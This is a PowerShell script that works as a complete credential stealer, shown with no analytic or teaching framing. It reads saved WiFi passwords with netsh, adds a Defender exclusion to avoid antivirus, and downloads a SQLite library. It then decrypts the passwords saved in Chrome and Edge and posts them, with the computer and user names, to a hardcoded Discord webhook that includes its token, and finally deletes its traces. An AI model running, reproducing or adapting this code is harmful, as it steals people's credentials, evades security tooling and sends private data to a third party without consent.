# Discord Webhook
$webhook = "https://discord.com/api/webhooks/1467247480428171385/TSirVX8AGKGeYAOImDkrGzyQGQjgGRMq6_E-zkv8UTIzu5jBzFGIC4ug15xtQSTys27R"

# Get PC info
$pc = "$env:COMPUTERNAME | $env:USERNAME"

# === WiFi Passwords ===
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
$wifi = ""
foreach($name in $wifiProfiles) {
    $profileInfo = netsh wlan show profile name="$name" key=clear
    $passLine = $profileInfo | Select-String "Key Content\W+\:(.+)$"
    if($passLine) {
        $pass = $passLine.Matches.Groups[1].Value.Trim()
        $wifi += "$name : $pass`n"
    }
}
if(-not $wifi) { $wifi = "No WiFi networks found" }

# === Browser Passwords ===
$tempDir = "$env:TEMP\bd_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue

$browsers = ""

try {
    # Download System.Data.SQLite DLL
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $sqliteUrl = "https://system.data.sqlite.org/blobs/1.0.118.0/sqlite-netFx46-binary-x64-2015-1.0.118.0.zip"
    $sqliteZip = "$tempDir\sqlite.zip"
    Invoke-WebRequest -Uri $sqliteUrl -OutFile $sqliteZip -UseBasicParsing
    
    # Extract
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($sqliteZip, $tempDir)
    
    # Load the DLL
    $sqliteDll = Get-ChildItem -Path $tempDir -Filter "System.Data.SQLite.dll" -Recurse | Select-Object -First 1
    if($sqliteDll) {
        Add-Type -Path $sqliteDll.FullName
        Add-Type -AssemblyName System.Security
        
        # Find all browser databases
        $databases = @()
        
        # Chrome
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        if(Test-Path $chromePath) {
            Get-ChildItem $chromePath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
                if($_.FullName -notmatch "Snapshots") { $databases += $_ }
            }
        }
        
        # Edge
        $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        if(Test-Path $edgePath) {
            Get-ChildItem $edgePath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
                if($_.FullName -notmatch "Snapshots") { $databases += $_ }
            }
        }
        
        foreach($db in $databases) {
            try {
                $tempDb = "$tempDir\ld_$(Get-Random).db"
                Copy-Item $db.FullName $tempDb -Force
                
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                $reader = $cmd.ExecuteReader()
                
                while($reader.Read()) {
                    $url = $reader["origin_url"]
                    $user = $reader["username_value"]
                    $encPass = [byte[]]$reader["password_value"]
                    
                    if($encPass -and $encPass.Length -gt 0) {
                        try {
                            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
                            $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
                            
                            if($password) {
                                $browsers += "$url`nUser: $user`nPass: $password`n`n"
                            }
                        } catch {}
                    }
                }
                $conn.Close()
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            } catch {}
        }
    } else {
        $browsers = "SQLite DLL not found after extraction"
    }
    
} catch {
    $browsers = "Error: $($_.Exception.Message)"
}

if(-not $browsers) { $browsers = "No passwords found" }

# Clean up
Remove-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue

# === Format and Send ===
$output = @"
**PC: $pc**

**=== WiFi Networks ===**
$wifi

**=== Browser Passwords ===**
$browsers
"@

# Split into chunks
$maxLen = 1900
if($output.Length -gt $maxLen) {
    for($i = 0; $i -lt $output.Length; $i += $maxLen) {
        $chunk = $output.Substring($i, [Math]::Min($maxLen, $output.Length - $i))
        $body = @{ content = $chunk } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
        Start-Sleep -Milliseconds 500
    }
} else {
    $body = @{ content = $output } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
}
